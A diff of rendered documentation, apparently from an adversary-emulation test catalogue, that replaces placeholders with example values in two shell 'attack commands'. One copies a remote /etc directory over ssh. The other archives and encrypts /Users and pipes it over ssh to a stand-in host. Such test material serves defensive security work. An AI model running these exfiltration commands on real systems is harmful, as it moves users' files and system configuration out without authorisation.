@@ -372,7 +372,7 @@
 <p><strong>Supported Platforms:</strong> macos, linux</p>
 <div class="section" id="attack-commands-run-with-sh">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code><a class="headerlink" href="#attack-commands-run-with-sh" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>ssh <span class="c1">#{domain} &quot;(cd /etc &amp;&amp; tar -zcvf - *)&quot; &gt; ./etc.tar.gz</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>ssh target.example.com <span class="s2">&quot;(cd /etc &amp;&amp; tar -zcvf - *)&quot;</span> &gt; ./etc.tar.gz
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -392,7 +392,7 @@
 <p><strong>Supported Platforms:</strong> macos, linux</p>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>tar czpf - /Users/* <span class="p">|</span> openssl des3 -salt -pass <span class="c1">#{password} | ssh #{user_name}@#{domain} &#39;cat &gt; /Users.tar.gz.enc&#39;</span>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>tar czpf - /Users/* <span class="p">|</span> openssl des3 -salt -pass atomic <span class="p">|</span> ssh atomic@target.example.com <span class="s1">&#39;cat &gt; /Users.tar.gz.enc&#39;</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
